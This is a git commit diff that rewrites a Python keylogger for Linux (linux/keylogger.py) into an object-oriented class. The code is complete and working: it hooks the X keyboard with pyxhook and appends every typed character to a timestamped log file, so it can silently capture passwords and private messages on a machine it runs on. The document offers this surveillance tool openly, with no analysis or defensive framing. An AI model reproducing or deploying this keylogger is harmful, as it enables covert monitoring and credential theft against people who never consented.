1195480e4c115deea157349fc7feb1096239f6d4
olalekanolanrewaju <78469928+olalekanolanrewaju@users.noreply.github.com>
2023-05-08 14:32:45 +0100

    Update keylogger.py
    This version of the code is now object-oriented and encapsulates the keylogger logic in a class, which can be instantiated and started as needed. The on_key_press method is used as the event handler for key presses, and the start method sets up the hook and starts listening for key presses.

--- linux/keylogger.py
+++ linux/keylogger.py
@@ -1,40 +1,45 @@
-# import needed modules
 import os
 from datetime import datetime
 import pyxhook
 
-def main():
-    # Specify the name of the file (can be changed )
-    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
+class Keylogger:
+    def __init__(self):
+        # Set up the log file path
+        self.log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
 
-    # The logging function with {event parm}
-    def OnKeyPress(event):
-
-        with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
+    def on_key_press(self, event):
+        # Log the key press to the file
+        with open(self.log_file, "a") as f:
             if event.Key == 'P_Enter' :
                 f.write('\n')
             else:
-                f.write(f"{chr(event.Ascii)}")  # Write to the file and convert ascii to readable characters
+                f.write(f"{chr(event.Ascii)}")
 
-    # Create a hook manager object
-    new_hook = pyxhook.HookManager()
-    new_hook.KeyDown = OnKeyPress
+    def start(self):
+        # Create a hook manager object
+        new_hook = pyxhook.HookManager()
 
-    new_hook.HookKeyboard()  # set the hook
+        # Set up the key down event handler
+        new_hook.KeyDown = self.on_key_press
 
-    try:
-        new_hook.start()  # start the hook
-    except KeyboardInterrupt:
-        # User cancelled from command line so close the listener
-        new_hook.cancel()
-        pass
-    except Exception as ex:
-        # Write exceptions to the log file, for analysis later.
-        msg = f"Error while catching events:\n  {ex}"
-        pyxhook.print_err(msg)
-        with open(log_file, "a") as f:
-            f.write(f"\n{msg}")
+        # Set the keyboard hook
+        new_hook.HookKeyboard()
 
+        try:
+            # Start the hook
+            new_hook.start()
+        except KeyboardInterrupt:
+            # If the user cancels, close the listener
+            new_hook.cancel()
+            return
+        except Exception as ex:
+            # Log exceptions to the file
+            msg = f"Error while catching events:\n  {ex}"
+            pyxhook.print_err(msg)
+            with open(self.log_file, "a") as f:
+                f.write(f"\n{msg}")
 
 if __name__ == "__main__":
-    main()
+    # Create a new Keylogger object and start it
+    keylogger = Keylogger()
+    keylogger.start()
